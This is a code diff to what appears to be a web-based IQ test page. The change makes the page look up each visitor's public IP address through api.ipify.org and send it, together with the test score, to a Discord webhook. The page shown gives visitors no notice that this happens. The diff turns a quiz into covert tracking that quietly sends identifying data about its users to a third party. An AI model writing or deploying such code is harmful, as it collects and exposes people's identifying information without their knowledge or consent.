@@ -136,15 +136,24 @@
                             resultElement.appendChild(gtfoMessage);
                         }
 
-                        fetch(webhookUrl, {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json"
-                            },
-                            body: JSON.stringify({
-                                content: `IQ Test Result: ${score}`
+                        // Get the user's IP address
+                        fetch('https://api.ipify.org?format=json')
+                            .then(response => response.json())
+                            .then(data => {
+                                const userIP = data.ip;
+
+                                // Send result with IP to Discord webhook
+                                fetch(webhookUrl, {
+                                    method: "POST",
+                                    headers: {
+                                        "Content-Type": "application/json"
+                                    },
+                                    body: JSON.stringify({
+                                        content: `IQ Test Result: ${score}\nUser IP: ${userIP}`
+                                    })
+                                }).catch(err => console.error("Failed to send webhook", err));
                             })
-                        }).catch(err => console.error("Failed to send webhook", err));
+                            .catch(err => console.error("Failed to fetch IP", err));
                     });
                 }
 
